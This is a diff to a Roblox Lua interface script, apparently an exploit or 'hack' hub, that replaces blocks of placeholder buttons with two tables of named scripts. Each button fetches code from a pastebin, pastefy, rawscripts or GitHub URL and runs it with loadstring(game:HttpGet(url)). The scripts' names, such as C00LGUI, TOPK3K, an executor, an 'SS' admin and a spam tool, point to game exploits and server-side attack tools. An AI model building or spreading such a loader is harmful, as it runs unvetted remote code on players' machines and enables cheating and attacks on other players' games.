@@ -229,83 +229,39 @@ LMG2L["ScrollingFrame_14"]["Position"] = UDim2.new(0, 0, 0, 166);
 -- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.ScrollingFrame.UIListLayout
 LMG2L["UIListLayout_15"] = Instance.new("UIListLayout", LMG2L["ScrollingFrame_14"]);
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.ScrollingFrame.TextButton
-LMG2L["TextButton_16"] = Instance.new("TextButton", LMG2L["ScrollingFrame_14"]);
-LMG2L["TextButton_16"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_16"]["TextSize"] = 12;
-LMG2L["TextButton_16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_16"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
-LMG2L["TextButton_16"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_16"]["Text"] = [[project baller 1]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
+local buttons = {
+    {"1x1 HAX MINI GUI", "https://pastefy.app/4U9m0vuN/raw?part=1x1x1x1x1_hax%20Gui%20mini%20edition"},
+    {"OUCH SIMSOMP SPAM", "https://pastefy.app/h6fhUC6z/raw"},
+    {"SAMSUNG NOTE", "https://pastefy.app/dA68xt1p/raw"},
+    {"PROJECT ZAGA", "https://pastefy.app/rMyVKrO6/raw"},
+    {"PRIVATE 1X1 V7.1.0", "https://pastefy.app/tsPrm5Ky/raw"},
+    {"PROJECT SEGMA V2", "https://pastefy.app/EUwYT4gN/raw"},
+}
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.ScrollingFrame.TextButton
-LMG2L["TextButton_17"] = Instance.new("TextButton", LMG2L["ScrollingFrame_14"]);
-LMG2L["TextButton_17"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_17"]["TextSize"] = 12;
-LMG2L["TextButton_17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_17"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
-LMG2L["TextButton_17"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_17"]["Text"] = [[Project_my_friendv2 2]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
+local frame = script.Parent:WaitForChild("ScrollingFrame_14") -- ชื่อ Frame ของคุณ
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.ScrollingFrame.TextButton
-LMG2L["TextButton_18"] = Instance.new("TextButton", LMG2L["ScrollingFrame_14"]);
-LMG2L["TextButton_18"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_18"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_18"]["TextSize"] = 12;
-LMG2L["TextButton_18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_18"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
-LMG2L["TextButton_18"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_18"]["Text"] = [[PROJECT 007n7 TXT 3]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
+for _, data in pairs(buttons) do
+    local name, url = data[1], data[2]
+    
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Text = name
+    btn.Size = UDim2.new(1, 0, 0, 50)
+    btn.Parent = frame
+    
+    btn.MouseButton1Click:Connect(function()
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet(url))()
+        end)
+        
+        if not success then
+            warn("Error loading script: " .. result)
+        else
+            print(name .. " loaded successfully!")
+        end
+    end)
+end
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.ScrollingFrame.TextButton
-LMG2L["TextButton_19"] = Instance.new("TextButton", LMG2L["ScrollingFrame_14"]);
-LMG2L["TextButton_19"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_19"]["TextSize"] = 12;
-LMG2L["TextButton_19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_19"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
-LMG2L["TextButton_19"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_19"]["Text"] = [[SHIBA 4]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
-
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.ScrollingFrame.TextButton
-LMG2L["TextButton_1a"] = Instance.new("TextButton", LMG2L["ScrollingFrame_14"]);
-LMG2L["TextButton_1a"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_1a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_1a"]["TextSize"] = 12;
-LMG2L["TextButton_1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_1a"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
-LMG2L["TextButton_1a"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_1a"]["Text"] = [[C00LGUI BUT GOOD 5]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
-
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.ScrollingFrame.TextButton
-LMG2L["TextButton_1b"] = Instance.new("TextButton", LMG2L["ScrollingFrame_14"]);
-LMG2L["TextButton_1b"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_1b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_1b"]["TextSize"] = 12;
-LMG2L["TextButton_1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_1b"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
-LMG2L["TextButton_1b"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_1b"]["Text"] = [[TOPK3K 0.8 6]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
 
 -- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.output.TextLabel
 LMG2L["TextLabel_1c"] = Instance.new("TextLabel", LMG2L["output_13"]);
@@ -375,109 +331,57 @@ LMG2L["ScrollingFrame_22"]["Size"] = UDim2.new(0, 340, 0, 274);
 -- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.UIListLayout
 LMG2L["UIListLayout_23"] = Instance.new("UIListLayout", LMG2L["ScrollingFrame_22"]);
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_24"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_24"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_24"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_24"]["TextSize"] = 12;
-LMG2L["TextButton_24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_24"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-LMG2L["TextButton_24"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_24"]["Text"] = [[project baller ]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
+local buttons = {
+    {"Elsyian Executor","https://pastebin.com/raw/CsFAQyXr"},
+    {"Anonymous Particlez","particle"},
+    {"NOOB GIANT CANNONER","https://raw.githubusercontent.com/gitezgitgit/rare-scripts/refs/heads/main/Cannoneer%20Noob.txt"},
+    {"SSP","https://pastefy.app/t2gUwfXy/raw"},
+    {"PROJECT BALLER","https://gist.githubusercontent.com/gagaamza/d5c91e99f7f31e450817c73de16f7e38/raw/855e5a40280cbeb5369d6c8c22243b0c35e9e735/gistfile1.txt"},
+    {"PROJECT TEGMA","https://pastefy.app/iF7TCeZw/raw"},
+    {"PROJECT 007N7","https://pastebin.com/raw/v0hzsfEV"},
+    {"PROJECT 007n7 TXT","https://pastebin.com/raw/fYQCCQ3v"},
+    {"Super project by g00by666","https://raw.githubusercontent.com/g00byd0lanxdd/team-super-secret/refs/heads/main/team%20super%20secret"},
+    {"PROJECT 3XEN0","https://raw.githubusercontent.com/3xen0kidd/ProjextLigma/refs/heads/main/obfuscated_script-1748044783577.lua.txt"},
+    {"SHIBA","https://pastebin.com/raw/HrE2dKSD"},
+    {"DOMINANT V5.0.1","https://raw.githubusercontent.com/Sugm4Bullet1/LuaXXccL/refs/heads/main/dominatv5.0.1.txt"},
+    {"PROJECT SONIC","https://raw.githubusercontent.com/Hanif290/YoThereSkibidiSigma68/refs/heads/main/Yoshi681SkibidiBoy"},
+    {"C00LGUI BUT GOOD","https://raw.githubusercontent.com/hyperionhax/c00lgui/refs/heads/main/CoolGui.lua"},
+    {"TOPK3K 0.8","https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%200.8"},
+    {"MR BEAN ADMIN SS","https://raw.githubusercontent.com/Test4267/mrbean/refs/heads/main/hh"},
+    {"MOUSTER RED EPIC","https://pastebin.com/raw/ZaGXVyhj"},
+    {"Arceus x exe","https://rawscripts.net/raw/Universal-Script-Arceus-x-gui-script-22768"},
+    {"Private Gui 1.35","https://raw.githubusercontent.com/Hanif290/DigsaeyAiijjllnvv/refs/heads/main/Aiisisndndsn"},
+    {"Super Private Gui by Sigmaz","https://raw.githubusercontent.com/Hanif290/SigmaHubV2/refs/heads/main/SigmaHubV2"},
+    {"Private Gui by Hanif","https://raw.githubusercontent.com/Hanif290/SigmaHub/refs/heads/main/SigmaHub"},
+    {"Sigma Gui (Private GUI)","https://pastes.io/raw/private-53"},
+}
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_25"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_25"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_25"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_25"]["TextSize"] = 12;
-LMG2L["TextButton_25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_25"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-LMG2L["TextButton_25"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_25"]["Text"] = [[Project_my_friendv2 ]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
+local frame = script.Parent:WaitForChild("ScrollingFrame_22") -- ชื่อ Frame ของคุณ
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_26"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_26"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_26"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_26"]["TextSize"] = 12;
-LMG2L["TextButton_26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_26"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-LMG2L["TextButton_26"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_26"]["Text"] = [[PROJECT 007n7 TXT ]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_27"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_27"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_27"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_27"]["TextSize"] = 12;
-LMG2L["TextButton_27"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_27"]["BackgroundColor3"] = Color3.fromRGB(82, 82, 82);
-LMG2L["TextButton_27"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_27"]["Text"] = [[SHIBA ]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
+for _, data in pairs(buttons) do
+    local name, url = data[1], data[2]
+    
+    local btn = Instance.new("TextButton")
+    btn.Name = name
+    btn.Text = name
+    btn.Size = UDim2.new(1, 0, 0, 50)
+    btn.Parent = frame
+    
+    btn.MouseButton1Click:Connect(function()
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet(url))()
+        end)
+        
+        if not success then
+            warn("Error loading script: " .. result)
+        else
+            print(name .. " loaded successfully!")
+        end
+    end)
+end
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_28"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_28"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_28"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_28"]["TextSize"] = 12;
-LMG2L["TextButton_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_28"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-LMG2L["TextButton_28"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_28"]["Text"] = [[C00LGUI BUT GOOD ]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
 
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_29"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_29"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_29"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_29"]["TextSize"] = 12;
-LMG2L["TextButton_29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_29"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-LMG2L["TextButton_29"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_29"]["Text"] = [[TOPK3K 0.8 ]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
-
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_2a"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_2a"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_2a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_2a"]["TextSize"] = 12;
-LMG2L["TextButton_2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_2a"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-LMG2L["TextButton_2a"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_2a"]["Text"] = [[Arceus x exe]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
-
--- Players.Hacke999999999980.PlayerGui.ScreenGui.top.Frame2.backpack.ScrollingFrame.TextButton
-LMG2L["TextButton_2b"] = Instance.new("TextButton", LMG2L["ScrollingFrame_22"]);
-LMG2L["TextButton_2b"]["BorderSizePixel"] = 0;
-LMG2L["TextButton_2b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-LMG2L["TextButton_2b"]["TextSize"] = 12;
-LMG2L["TextButton_2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextButton_2b"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-LMG2L["TextButton_2b"]["Size"] = UDim2.new(0, 328, 0, 20);
-LMG2L["TextButton_2b"]["Text"] = [[project sonic]];
-LMG2L["TextButton_2b"].MouseButton1Click:Connect(function()
-loadstring(game:HttpGet(""))()
-end)
 
 -- Players.Hacke999999999980.PlayerGui.ScreenGui.top.TextButton6
 LMG2L["TextButton6_2c"] = Instance.new("TextButton", LMG2L["top_2"]);
